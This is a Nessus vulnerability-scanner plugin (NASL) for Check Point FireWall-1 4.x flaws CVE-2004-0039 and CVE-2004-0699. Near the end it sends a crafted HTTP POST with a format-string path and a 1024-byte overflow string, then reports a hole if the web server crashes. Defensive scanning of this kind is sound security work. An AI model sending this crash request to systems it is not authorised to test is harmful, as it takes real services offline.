#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");


if(description)
{
    script_id(12084);
    script_version ("$Revision: 1.19 $");
    script_cve_id("CVE-2004-0039", "CVE-2004-0699");
    script_bugtraq_id(10820, 9581);
    script_xref(name:"IAVA", value:"2004-A-0002");
    script_xref(name:"IAVA", value:"2004-t-0022");
    script_xref(name:"OSVDB", value:"4414");
    script_xref(name:"OSVDB", value:"8290");

    script_name(english:"Check Point FireWall-1 4.x Multiple Vulnerabilities (OF, FS)");
    script_summary(english:"Crash Check Point Firewall");

    script_set_attribute(
      attribute:"synopsis",
      value:"The remote web server has a denial of service vulnerability."
    );
    script_set_attribute(
      attribute:"description", 
      value:string(
        "The remote Check Point Firewall web server crashes when sent a\n",
        "specially formatted HTTP request.  A remote attacker could use\n",
        "this to crash the web server, or possibly execute arbitrary code.\n\n",
        "This bug is a solid indicator that the server is vulnerable to\n",
        "several other Check Point FW-1 4.x bugs that Nessus did not check for."
      )
    );
    script_set_attribute(
      attribute:"see_also",
      value:"http://www.checkpoint.com/services/techsupport/alerts/security_server.html"
    );
    script_set_attribute(
      attribute:"solution", 
      value:"Apply the configurationn change referenced in the vendor's advisory."
    );
    script_set_attribute(
      attribute:"cvss_vector", 
      value:"CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P"
    );
    script_end_attributes();

    script_category(ACT_DENIAL);
    script_family(english:"Firewalls");

    script_copyright(english:"This script is Copyright (C) 2004-2009 Tenable Network Security, Inc.");

    script_dependencie("http_version.nasl");
    script_require_keys("Settings/ParanoidReport");
    exit(0);
}

#
# The script code starts here

include("global_settings.inc");
include ("misc_func.inc");
include ("http.inc");

if (report_paranoia < 2) exit(0);

port = get_http_port(default:80);

# first off, make sure server is actually responding and is FW-1
r = http_get_cache(item:"/", port:port);
if ( (!r) || (! egrep(string:r, pattern:"^FW-1 at")) ) exit(0);

# The old script used a method that was prone to FPs
if (http_is_dead(port: port)) exit(0);

req = string("POST %s/NessusScanner/nonexistent.html HTTP/1.0\r\n");
req +=  string(crap(data:"A", length:1024), "\r\n\r\n");

r = http_send_recv_buf(port: port, data: req);

if (http_is_dead(port: port, retry: 2)) security_hole(port);
